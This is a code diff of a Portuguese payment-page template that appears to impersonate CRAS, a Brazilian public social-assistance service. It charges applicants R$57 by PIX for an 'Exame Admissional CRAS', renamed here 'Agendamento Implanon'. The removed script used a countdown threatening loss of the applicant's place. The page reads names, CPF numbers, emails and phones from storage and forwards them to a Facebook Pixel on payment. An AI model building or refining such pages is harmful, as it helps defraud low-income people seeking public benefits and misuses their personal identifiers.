@@ -294,113 +294,8 @@
         </div>
     </section>
 
-    <!-- Footer -->
-    <footer class="bg-[#044785] text-white py-8 md:py-12">
-        <div class="container mx-auto px-4 md:px-8">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">O que é o CRAS</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
-                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
-                    <ul class="space-y-2 text-sm text-white">
-                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
-                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
-                    </ul>
-                </div>
-            </div>
-            
-            <hr class="border-blue-400 mb-6">
-            
-            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
-                <div class="mb-4 md:mb-0">
-                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
-                </div>
-                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
-                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
-                    <span>|</span>
-                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
-                </div>
-                <div class="flex space-x-4 mt-4 md:mt-0">
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
-                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
-                </div>
-            </div>
-        </div>
-    </footer>
-
+    <!-- Facebook Pixel and Payment Status Scripts -->
     <script>
-        // 10-minute countdown timer
-        let timeLeft = 10 * 60; // 10 minutes in seconds
-        const timerElement = document.getElementById('countdown-timer');
-        
-        function updateTimer() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            
-            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
-            
-            // Change color when time is running out
-            if (timeLeft <= 120) { // Last 2 minutes
-                timerElement.classList.add('text-red-800', 'animate-pulse');
-            } else if (timeLeft <= 300) { // Last 5 minutes
-                timerElement.classList.add('text-red-700');
-            }
-            
-            if (timeLeft <= 0) {
-                // Time's up - redirect to timeout page
-                timerElement.textContent = "TEMPO ESGOTADO!";
-                timerElement.classList.add('text-red-900', 'bg-red-100');
-                setTimeout(() => {
-                    alert("Tempo esgotado! Você perdeu sua vaga. Será redirecionado para nova tentativa.");
-                    window.location.href = "/agendamento";
-                }, 2000);
-                return;
-            }
-            
-            timeLeft--;
-        }
-        
-        // Hide loading overlay after 3 seconds
-        setTimeout(function() {
-            document.getElementById('payment-loading').style.display = 'none';
-        }, 3000);
-        
         // Retrieve user data from localStorage if available
         const userData = {
             name: localStorage.getItem('candidateName') || 'Candidato',
@@ -412,15 +307,12 @@
         console.log('User data from localStorage:', userData);
         
         // Check if we have real user data and recreate PIX payment if needed
-        // Priority 1: Full data with email
-        // Priority 2: Real name and CPF even without email (will use fallback)
         if ((userData.email && userData.email !== '' && userData.name && userData.name !== 'Candidato') ||
             (userData.name && userData.name !== 'Candidato' && userData.cpf && userData.cpf !== '')) {
             console.log('Real user data found, recreating PIX payment with authentic data...');
             
             // Garantir que temos um email válido
             if (!userData.email || userData.email === '') {
-                // Gerar email baseado no nome do usuário se não houver email
                 const cleanName = userData.name.toLowerCase().replace(/[^a-z]/g, '');
                 userData.email = cleanName + '@candidato.com.br';
                 console.log('Email gerado automaticamente:', userData.email);
@@ -460,518 +352,65 @@
                         console.log('QR code updated with official API image');
                     }
                     
-                    // Clear any existing status check interval
-                    if (statusCheckInterval) {
-                        clearInterval(statusCheckInterval);
-                    }
+                    // Start automatic payment status checking
+                    const newPaymentId = data.payment_data.id;
+                    console.log('Starting automatic payment status check for transaction:', newPaymentId);
                     
-                    // Start payment status checking immediately after payment creation with new ID
-                    setTimeout(() => {
-                        console.log('Starting status check for NEW payment ID:', data.payment_data.id);
-                        
-                        // Clear any existing intervals first
-                        if (window.statusCheckInterval) {
-                            clearInterval(window.statusCheckInterval);
-                        }
-                        
-                        // USAR SEMPRE O NOVO ID DE PAGAMENTO CRIADO
-                        const newPaymentId = data.payment_data.id;
-                        console.log('INICIANDO VERIFICAÇÃO COM NOVO ID:', newPaymentId);
-                        
-                        // Limpar TODAS as verificações anteriores
-                        try {
-                            clearInterval(window.currentStatusInterval);
-                            clearInterval(window.statusCheckInterval);
-                            clearInterval(window.activePaymentCheck);
-                            clearInterval(statusCheckInterval);
-                            clearInterval(currentStatusInterval);
-                        } catch (e) {
-                            console.log('Intervalos limpos');
-                        }
-                        
-                        // LIMPAR tudo e usar apenas o novo ID
-                        if (window.paymentMonitor) clearInterval(window.paymentMonitor);
-                        
-                        // Definir ID atual da transação
-                        window.currentTransactionId = newPaymentId;
-                        console.log('PIX ATUAL:', newPaymentId);
-                        
-                        // Sistema de monitoramento dedicado
-                        window.paymentMonitor = setInterval(() => {
-                            fetch(`/check_payment_status/${newPaymentId}`)
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log(`Status PIX ${newPaymentId}:`, data.status);
-                                    if (data.success && data.redirect) {
-                                        clearInterval(window.paymentMonitor);
-                                        console.log('PAGAMENTO APROVADO - Disparando Facebook Pixel');
+                    // Payment status monitor
+                    const statusCheckInterval = setInterval(() => {
+                        fetch(`/check_payment_status/${newPaymentId}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Payment status check result:', data);
+                                if (data.success && data.redirect) {
+                                    clearInterval(statusCheckInterval);
+                                    console.log('PAYMENT APPROVED - Firing Facebook Pixel');
+                                    
+                                    // Fire Facebook Pixel Purchase event for approved sale
+                                    if (typeof fbq !== 'undefined') {
+                                        const eventData = {
+                                            value: 57.00,
+                                            currency: 'BRL',
+                                            content_type: 'product',
+                                            content_ids: [newPaymentId],
+                                            content_name: 'Agendamento Implanon'
+                                        };
                                         
-                                        // Fire Facebook Pixel Purchase event for approved sale
-                                        if (typeof fbq !== 'undefined') {
-                                            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-                                            const customerData = {};
-                                            
-                                            // Prepare customer data for pixel
-                                            if (userData.email || localStorage.getItem('candidateEmail')) {
-                                                customerData.em = (userData.email || localStorage.getItem('candidateEmail')).toLowerCase().trim();
-                                            }
-                                            if (userData.phone || localStorage.getItem('candidatePhone')) {
-                                                customerData.ph = (userData.phone || localStorage.getItem('candidatePhone')).replace(/\D/g, '');
-                                            }
-                                            if (userData.full_name || localStorage.getItem('candidateName')) {
-                                                const fullName = userData.full_name || localStorage.getItem('candidateName');
-                                                const nameParts = fullName.toLowerCase().split(' ');
-                                                customerData.fn = nameParts[0] || '';
-                                                customerData.ln = nameParts[nameParts.length - 1] || '';
-                                            }
-                                            if (userData.cpf || localStorage.getItem('candidateCPF')) {
-                                                customerData.external_id = (userData.cpf || localStorage.getItem('candidateCPF')).replace(/\D/g, '');
-                                            }
-                                            
-                                            const eventData = {
-                                                value: 57.00,
-                                                currency: 'BRL',
-                                                content_type: 'product',
-                                                content_ids: [newPaymentId],
-                                                content_name: 'Exame Admissional CRAS'
-                                            };
-                                            
-                                            // Fire the Purchase event
-                                            fbq('track', 'Purchase', eventData, customerData);
-                                            console.log('Facebook Pixel Purchase event fired for pixel: 1418766538994503', {
-                                                eventData: eventData,
-                                                customerData: customerData
-                                            });
+                                        const customerData = {};
+                                        if (userData.email) customerData.em = userData.email.toLowerCase().trim();
+                                        if (userData.phone) customerData.ph = userData.phone.replace(/\D/g, '');
+                                        if (userData.name) {
+                                            const nameParts = userData.name.toLowerCase().split(' ');
+                                            customerData.fn = nameParts[0] || '';
+                                            customerData.ln = nameParts[nameParts.length - 1] || '';
                                         }
+                                        if (userData.cpf) customerData.external_id = userData.cpf.replace(/\D/g, '');
                                         
-                                        console.log('REDIRECIONANDO PARA CNV');
-                                        window.location.replace('/aviso');
+                                        // Fire the Purchase event
+                                        fbq('track', 'Purchase', eventData, customerData);
+                                        console.log('Facebook Pixel Purchase event fired for R$ 57.00', {
+                                            eventData: eventData,
+                                            customerData: customerData
+                                        });
                                     }
-                                })
-                                .catch(error => console.log('Erro verificação:', error));
-                        }, 300);
-                        
-                        // Verificação imediata do PIX atual
-                        setTimeout(() => {
-                            fetch(`/check_payment_status/${newPaymentId}`)
-                                .then(response => response.json())
-                                .then(data => {
-                                    if (data.success && data.redirect) {
-                                        clearInterval(window.paymentMonitor);
-                                        console.log('PIX APROVADO - Disparando Facebook Pixel');
-                                        
-                                        // Fire Facebook Pixel Purchase event for approved sale
-                                        if (typeof fbq !== 'undefined') {
-                                            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-                                            const customerData = {};
-                                            
-                                            // Prepare customer data for pixel
-                                            if (userData.email || localStorage.getItem('candidateEmail')) {
-                                                customerData.em = (userData.email || localStorage.getItem('candidateEmail')).toLowerCase().trim();
-                                            }
-                                            if (userData.phone || localStorage.getItem('candidatePhone')) {
-                                                customerData.ph = (userData.phone || localStorage.getItem('candidatePhone')).replace(/\D/g, '');
-                                            }
-                                            if (userData.full_name || localStorage.getItem('candidateName')) {
-                                                const fullName = userData.full_name || localStorage.getItem('candidateName');
-                                                const nameParts = fullName.toLowerCase().split(' ');
-                                                customerData.fn = nameParts[0] || '';
-                                                customerData.ln = nameParts[nameParts.length - 1] || '';
-                                            }
-                                            if (userData.cpf || localStorage.getItem('candidateCPF')) {
-                                                customerData.external_id = (userData.cpf || localStorage.getItem('candidateCPF')).replace(/\D/g, '');
-                                            }
-                                            
-                                            const eventData = {
-                                                value: 57.00,
-                                                currency: 'BRL',
-                                                content_type: 'product',
-                                                content_ids: [newPaymentId],
-                                                content_name: 'Exame Admissional CRAS'
-                                            };
-                                            
-                                            // Fire the Purchase event
-                                            fbq('track', 'Purchase', eventData, customerData);
-                                            console.log('Facebook Pixel Purchase event fired for pixel: 1418766538994503', {
-                                                eventData: eventData,
-                                                customerData: customerData
-                                            });
-                                        }
-                                        
-                                        window.location.replace('/aviso');
-                                    }
-                                });
-                        }, 100);
+                                    
+                                    console.log('Redirecting to next step');
+                                    window.location.replace('/aviso');
+                                }
+                            })
+                            .catch(error => console.error('Error checking payment status:', error));
                     }, 1000);
+                    
                 } else {
                     console.warn('Failed to recreate PIX payment with real data');
                 }
             })
             .catch(error => {
                 console.error('Error recreating PIX payment:', error);
-                // Even if recreation fails, try to start status checking with existing payment ID
-                setTimeout(() => {
-                    startPaymentStatusCheck();
-                }, 2000);
             });
         } else {
             console.log('No complete user data found in localStorage, using existing payment');
         }
-        
-        // Update timer every second
-        updateTimer();
-        setInterval(updateTimer, 1000);
-        
-        // Load clinic and appointment data - VERSÃO SIMPLIFICADA
-        function loadClinicAndAppointmentInfo() {
-            console.log('🚀 EXECUTANDO loadClinicAndAppointmentInfo');
-            
-            // Verificar se os elementos existem
-            const clinicNameEl = document.getElementById('clinicName');
-            const clinicAddressEl = document.getElementById('clinicAddress');
-            const clinicPhoneEl = document.getElementById('clinicPhone');
-            const examDateTimeEl = document.getElementById('examDateTime');
-            
-            console.log('Elementos encontrados:', {
-                clinicName: !!clinicNameEl,
-                clinicAddress: !!clinicAddressEl,
-                clinicPhone: !!clinicPhoneEl,
-                examDateTime: !!examDateTimeEl
-            });
-            
-            if (!clinicNameEl) {
-                console.error('❌ Elemento clinicName não encontrado!');
-                return;
-            }
-            
-            // Obter dados do localStorage
-            const clinicDataStr = localStorage.getItem('clinicLocation');
-            const examDate = localStorage.getItem('examDate');
-            const examTime = localStorage.getItem('examTime');
-            
-            console.log('LocalStorage data:', {
-                clinicLocation: clinicDataStr,
-                examDate: examDate,
-                examTime: examTime
-            });
-            
-            // Atualizar dados da clínica
-            if (clinicDataStr) {
-                try {
-                    const clinicData = JSON.parse(clinicDataStr);
-                    console.log('📋 Dados da clínica parseados:', clinicData);
-                    
-                    if (clinicNameEl && clinicData.nome) {
-                        clinicNameEl.innerText = clinicData.nome;
-                        console.log('✅ Nome atualizado:', clinicData.nome);
-                    }
-                    
-                    if (clinicAddressEl && clinicData.endereco) {
-                        clinicAddressEl.innerText = clinicData.endereco;
-                        console.log('✅ Endereço atualizado:', clinicData.endereco);
-                    }
-                    
-                    if (clinicPhoneEl && clinicData.telefone) {
-                        clinicPhoneEl.innerText = 'Telefone: ' + clinicData.telefone;
-                        console.log('✅ Telefone atualizado:', clinicData.telefone);
-                    }
-                } catch (e) {
-                    console.error('❌ Erro ao fazer parse dos dados da clínica:', e);
-                }
-            } else {
-                console.log('⚠️ Nenhum dado de clínica no localStorage');
-            }
-            
-            // Atualizar data e horário
-            if (examDateTimeEl) {
-                if (examDate && examTime) {
-                    examDateTimeEl.innerText = examDate + ' às ' + examTime;
-                    console.log('✅ Data/hora atualizada:', examDate + ' às ' + examTime);
-                } else {
-                    examDateTimeEl.innerText = 'Data/horário não definido';
-                    console.log('⚠️ Data/horário não encontrado');
-                }
-            }
-            
-            console.log('🏁 FUNÇÃO CONCLUÍDA');
-        }
-        
-        // Executar imediatamente quando o script carrega
-        (function() {
-            console.log('Script executando imediatamente...');
-            loadClinicAndAppointmentInfo();
-        })();
-        
-        // Executar em múltiplos eventos
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOMContentLoaded - executando loadClinicAndAppointmentInfo');
-            loadClinicAndAppointmentInfo();
-        });
-        
-        window.addEventListener('load', function() {
-            console.log('Window load - executando loadClinicAndAppointmentInfo');
-            loadClinicAndAppointmentInfo();
-        });
-        
-        // Executar com delays
-        setTimeout(function() {
-            console.log('Timeout 100ms - executando loadClinicAndAppointmentInfo');
-            loadClinicAndAppointmentInfo();
-        }, 100);
-        
-        setTimeout(function() {
-            console.log('Timeout 500ms - executando loadClinicAndAppointmentInfo');
-            loadClinicAndAppointmentInfo();
-        }, 500);
-        
-        setTimeout(function() {
-            console.log('Timeout 1000ms - executando loadClinicAndAppointmentInfo');
-            loadClinicAndAppointmentInfo();
-        }, 1000);
-
-        // Populate clinic info inside payment boxes
-        function populateClinicInfoInBoxes() {
-            try {
-                const clinicDataStr = localStorage.getItem('clinicLocation');
-                const clinicData = clinicDataStr ? JSON.parse(clinicDataStr) : null;
-                const examDate = localStorage.getItem('examDate');
-                const examTime = localStorage.getItem('examTime');
-                
-                console.log('Populando info nas boxes - Clínica:', clinicData);
-                console.log('Populando info nas boxes - Data:', examDate, 'Horário:', examTime);
-                
-                if (clinicData || (examDate && examTime)) {
-                    // For success box
-                    const clinicInfoInBox = document.getElementById('clinicInfoInBox');
-                    if (clinicInfoInBox && clinicData) {
-                        const clinicNameInBox = document.getElementById('clinicNameInBox');
-                        const clinicAddressInBox = document.getElementById('clinicAddressInBox');
-                        const clinicPhoneInBox = document.getElementById('clinicPhoneInBox');
-                        const examDateTimeInBox = document.getElementById('examDateTimeInBox');
-                        
-                        if (clinicNameInBox) clinicNameInBox.textContent = clinicData.nome;
-                        if (clinicAddressInBox) clinicAddressInBox.textContent = clinicData.endereco;
-                        if (clinicPhoneInBox) clinicPhoneInBox.textContent = `Tel: ${clinicData.telefone}`;
-                        
-                        if (examDateTimeInBox) {
-                            if (examDate && examTime) {
-                                examDateTimeInBox.textContent = `${examDate} às ${examTime}`;
-                            } else if (examDate) {
-                                examDateTimeInBox.textContent = `${examDate} (horário a definir)`;
-                            }
-                        }
-                        
-                        clinicInfoInBox.style.display = 'block';
-                    }
-                    
-                    // For error box
-                    const clinicInfoInBoxError = document.getElementById('clinicInfoInBoxError');
-                    if (clinicInfoInBoxError && clinicData) {
-                        const clinicNameInBoxError = document.getElementById('clinicNameInBoxError');
-                        const clinicAddressInBoxError = document.getElementById('clinicAddressInBoxError');
-                        const clinicPhoneInBoxError = document.getElementById('clinicPhoneInBoxError');
-                        const examDateTimeInBoxError = document.getElementById('examDateTimeInBoxError');
-                        
-                        if (clinicNameInBoxError) clinicNameInBoxError.textContent = clinicData.nome;
-                        if (clinicAddressInBoxError) clinicAddressInBoxError.textContent = clinicData.endereco;
-                        if (clinicPhoneInBoxError) clinicPhoneInBoxError.textContent = `Tel: ${clinicData.telefone}`;
-                        
-                        if (examDateTimeInBoxError) {
-                            if (examDate && examTime) {
-                                examDateTimeInBoxError.textContent = `${examDate} às ${examTime}`;
-                            } else if (examDate) {
-                                examDateTimeInBoxError.textContent = `${examDate} (horário a definir)`;
-                            }
-                        }
-                        
-                        clinicInfoInBoxError.style.display = 'block';
-                    }
-                }
-            } catch (error) {
-                console.error('Erro ao popular informações nas boxes:', error);
-            }
-        }
-
-        // Load clinic information (legacy function)
-        function loadClinicInfo() {
-            try {
-                const clinicData = localStorage.getItem('clinicLocation');
-                if (clinicData) {
-                    const clinic = JSON.parse(clinicData);
-                    
-                    // Update clinic info elements
-                    const clinicNameEl = document.getElementById('clinicName');
-                    const clinicAddressEl = document.getElementById('clinicAddress');
-                    const clinicPhoneEl = document.getElementById('clinicPhone');
-                    const clinicInfoEl = document.getElementById('clinicInfo');
-                    
-                    if (clinicNameEl && clinicAddressEl && clinicPhoneEl && clinicInfoEl) {
-                        clinicNameEl.textContent = clinic.nome || 'Clínica não informada';
-                        clinicAddressEl.textContent = clinic.endereco || '';
-                        clinicPhoneEl.textContent = clinic.telefone ? `Tel: ${clinic.telefone}` : '';
-                        clinicInfoEl.style.display = 'block';
-                    }
-                }
-            } catch (error) {
-                console.error('Erro ao carregar clínica:', error);
-            }
-        }
-        function copyPixCode() {
-            const pixCode = document.getElementById('pixCodeInput');
-            pixCode.select();
-            pixCode.setSelectionRange(0, 99999); // For mobile devices
-            navigator.clipboard.writeText(pixCode.value);
-            
-            // Change button text temporarily
-            const button = event.target;
-            const originalText = button.textContent;
-            button.textContent = 'Copiado!';
-            button.style.backgroundColor = '#10B981';
-            button.style.color = 'white';
-            
-            setTimeout(() => {
-                button.textContent = originalText;
-                button.style.backgroundColor = '#044785';
-                button.style.color = 'white';
-            }, 2000);
-        }
-
-        // Payment monitoring system
-        window.currentTransactionId = null;
-        window.paymentMonitor = null;
-        
-        function startPaymentStatusCheck() {
-            // SEMPRE usar o ID mais recente criado
-            let transactionId = window.currentTransactionId;
-            
-            // If not available from template, try other sources
-            if (!transactionId || transactionId === 'None') {
-                const urlParams = new URLSearchParams(window.location.search);
-                transactionId = urlParams.get('transaction_id') || 
-                              sessionStorage.getItem('transactionId') || 
-                              localStorage.getItem('transactionId') ||
-                              localStorage.getItem('paymentId');
-                
-                // Also check if there's a payment data object in localStorage
-                if (!transactionId) {
-                    try {
-                        const paymentData = JSON.parse(localStorage.getItem('payment_data') || '{}');
-                        transactionId = paymentData.id || paymentData.transactionId;
-                    } catch (e) {
-                        console.log('Error parsing payment data from localStorage');
-                    }
-                }
-                
-                // Check for current payment ID in localStorage
-                if (!transactionId) {
-                    transactionId = localStorage.getItem('currentPaymentId');
-                }
-                
-                // Check if we have a global PIX payment ID from the page
-                if (!transactionId && window.currentPixPaymentId) {
-                    transactionId = window.currentPixPaymentId;
-                    console.log('Using global PIX payment ID:', transactionId);
-                }
-            }
-            
-            if (!transactionId || transactionId === 'None') {
-                console.log('No transaction ID found for status checking - retrying in 2 seconds...');
-                setTimeout(() => {
-                    startPaymentStatusCheck();
-                }, 2000);
-                return;
-            }
-            
-            console.log('Starting automatic payment status check for transaction:', transactionId);
-            
-            // Clear any existing intervals first
-            if (window.statusCheckInterval) {
-                clearInterval(window.statusCheckInterval);
-            }
-            
-            // Check payment status every 500ms for INSTANT redirection
-            window.statusCheckInterval = setInterval(() => {
-                checkPaymentStatus(transactionId);
-            }, 500);
-            
-            // Initial check
-            checkPaymentStatus(transactionId);
-        }
-        
-        function checkPaymentStatus(transactionId) {
-            fetch(`/check_payment_status/${transactionId}`)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Payment status check result:', data);
-                    
-                    if (data.success && data.redirect) {
-                        console.log('PIX APROVADO - REDIRECIONANDO AGORA!');
-                        
-                        // Fire Facebook Pixel Purchase event for approved sale
-                        if (typeof fbq !== 'undefined') {
-                            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-                            const customerData = {};
-                            
-                            // Prepare customer data for pixel
-                            if (userData.email || localStorage.getItem('candidateEmail')) {
-                                customerData.em = (userData.email || localStorage.getItem('candidateEmail')).toLowerCase().trim();
-                            }
-                            if (userData.phone || localStorage.getItem('candidatePhone')) {
-                                customerData.ph = (userData.phone || localStorage.getItem('candidatePhone')).replace(/\D/g, '');
-                            }
-                            if (userData.full_name || localStorage.getItem('candidateName')) {
-                                const fullName = userData.full_name || localStorage.getItem('candidateName');
-                                const nameParts = fullName.toLowerCase().split(' ');
-                                customerData.fn = nameParts[0] || '';
-                                customerData.ln = nameParts[nameParts.length - 1] || '';
-                            }
-                            if (userData.cpf || localStorage.getItem('candidateCPF')) {
-                                customerData.external_id = (userData.cpf || localStorage.getItem('candidateCPF')).replace(/\D/g, '');
-                            }
-                            
-                            const eventData = {
-                                value: 57.00,
-                                currency: 'BRL',
-                                content_type: 'product',
-                                content_ids: [transactionId],
-                                content_name: 'Exame Admissional CRAS'
-                            };
-                            
-                            // Fire the Purchase event
-                            fbq('track', 'Purchase', eventData, customerData);
-                            console.log('Facebook Pixel Purchase event fired for pixel: 1418766538994503', {
-                                eventData: eventData,
-                                customerData: customerData
-                            });
-                        }
-                        
-                        // Parar TODAS as verificações
-                        clearInterval(window.activePaymentCheck);
-                        clearInterval(window.statusCheckInterval);
-                        clearInterval(window.currentStatusInterval);
-                        
-                        // REDIRECIONAMENTO INSTANTÂNEO
-                        console.log('Redirecionando para /aviso...');
-                        window.location.href = '/aviso';
-                    }
-                })
-                .catch(error => {
-                    console.error('Error checking payment status:', error);
-                });
-        }
-        
-        // Start automatic payment checking when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            // Load clinic and appointment information first
-            loadClinicAndAppointmentInfo();
-            
-            // Also populate the clinic info inside payment boxes
-            populateClinicInfoInBoxes();
-            
-            // Start checking immediately for fastest redirection
-            setTimeout(() => {
-                startPaymentStatusCheck();
-            }, 3000);
-        });
     </script>
+
 {% endblock %}
